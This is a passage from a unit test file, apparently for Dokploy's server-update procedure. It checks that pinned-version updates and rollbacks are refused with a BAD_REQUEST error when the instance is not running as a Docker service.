			});

			expect(mocks.getDockerResourceType).toHaveBeenCalledWith("dokploy");
			expect(mocks.getUpdateData).not.toHaveBeenCalled();
			expect(mocks.runBackgroundJob).not.toHaveBeenCalled();
			expect(await spawned()).toEqual([]);
		},
	);

	it("refuses a pinned target and a rollback the same way", async () => {
		mocks.getDockerResourceType.mockResolvedValue("standalone");
		mocks.readDokployRollbackPoint.mockResolvedValue(recordedPoint);

		const refused = {
			code: "BAD_REQUEST",
			message: expect.stringContaining("not running as a Docker service"),
		};
		await expect(
			caller.updateServer({ target: "v0.30.8-community.31" }),
		).rejects.toMatchObject(refused);
		await expect(caller.updateServer({ rollback: true })).rejects.toMatchObject(
			refused,
		);

		expect(mocks.recordDokployRollbackPoint).not.toHaveBeenCalled();
		expect(await spawned()).toEqual([]);
	});
});
